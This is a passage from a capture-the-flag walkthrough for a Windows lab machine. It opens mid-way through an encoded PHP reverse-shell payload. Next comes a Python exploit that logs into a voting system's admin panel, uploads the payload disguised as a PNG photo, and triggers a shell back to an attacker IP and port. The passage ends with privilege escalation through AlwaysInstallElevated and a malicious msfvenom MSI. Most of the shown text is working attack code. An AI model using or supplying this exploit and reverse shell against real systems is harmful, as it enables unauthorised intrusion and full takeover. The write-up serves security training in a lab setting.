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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
			            
?>
"""
payload = payload.replace("IIPP", REV_IP)
payload = payload.replace("PPOORRTT", REV_PORT)

s = requests.Session()

def getCookies():
    r = s.get(INDEX_PAGE)
    return r.cookies

def login():
    cookies = getCookies()
    data = {
        "username":USERNAME,
        "password":PASSWORD,
        "login":""
    }
    r = s.post(LOGIN_URL, data=data, cookies=cookies)
    if r.status_code == 200:
        print("Logged in")
        return True
    else:
        return False

def sendPayload():
    if login():
        global payload
        payload = bytes(payload, encoding="UTF-8")
        files  = {'photo':('shell.php',payload, 
                    'image/png', {'Content-Disposition': 'form-data'}
                  ) 
              }
        data = {
            "firstname":"a",
            "lastname":"b",
            "password":"1",
            "add":""
        }
        r = s.post(VOTE_URL, data=data, files=files)
        if r.status_code == 200:
            print("Poc sent successfully")
        else:
            print("Error")

def callShell():
    r = s.get(CALL_SHELL, verify=False)
    if r.status_code == 200:
        print("Shell called check your listiner")
print("Start a NC listner on the port you choose above and run...")
sendPayload()
callShell()
```

Editing the settings and URL's to be as we need

```python
# --- Edit your settings here ----
IP = "10.10.10.239" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.200" # Reverse shell IP
REV_PORT = "9001" # Reverse port 
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
```

Fire up a netcat listener on port 9001 and run the exploit

![](img/first-nc.png)

We are logged on as user `love\phoebe`

Going into Phoebe's desktop we get the user flag

![](img/user.png)

## Privilege Escalation

Now we have the user flag, time to escalate. We will upload WinPEAS to the server and execute it to enumerate.

![](img/wp1.png)

![](img/wp2.png)

Looking at the output, we can see that `AlwaysInstalleElevated` is set to 1. That means that installing an MSI is always performed as the system account.

![](img/wp-out.png)

We can create a malicious msi with msfvenom and run this on the server.

![](img/venom.png)

Transfering the msi as we did for winPEAS, then we can start a netcat listener on out local machine and run the exploit.

![](img/root.png)

We have a shell as `nt authority\system` so let's get the root flag.

![](img/rootflag.png)

And that is the end of the box!!!

![](img/pwn.png)
